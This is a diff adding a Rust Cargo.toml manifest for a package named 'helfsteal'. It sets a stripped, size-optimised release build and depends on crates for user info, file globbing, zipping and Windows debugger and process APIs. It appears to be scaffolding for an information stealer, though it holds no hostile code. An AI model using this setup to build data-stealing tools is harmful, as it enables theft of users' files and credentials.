@@ -1,0 +1,20 @@
+cargo-features = ["strip"]
+
+[package]
+name = "helfsteal"
+version = "0.1.0"
+authors = ["Chesapeake Ripper"]
+
+[profile.release] 
+strip = "symbols" 
+debug  = false
+opt-level = "z" 
+panic = "abort"
+codegen-units = 1
+lto = true 
+
+[dependencies]
+whoami = "1.1.2"
+globwalk = "0.8.1"
+zip = "0.5.12"
+winapi = { version = "0.3", features = ["debugapi","tlhelp32", "winnt", "handleapi"] }
